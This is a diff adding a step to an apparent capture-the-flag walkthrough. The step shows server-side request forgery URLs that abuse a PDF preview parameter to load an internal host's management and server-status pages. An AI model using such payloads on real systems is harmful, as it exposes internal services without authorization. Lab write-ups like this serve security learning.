@@ -60,3 +60,14 @@ management
 server-status
 ```
 
+6. But, PDF Preview link may be able to load other URLs for us! 👍🏻
+```
+management:
+http://$TARGET/preview.php?url=http%3A%2F%2Fcvssm1%2Fmanagement%2F
+
+server-status:
+http://$TARGET/preview.php?url=http%3A%2F%2Fcvssm1%2Fserver-status%2F
+```
+
+![Management Page](images/06-management.png)
+
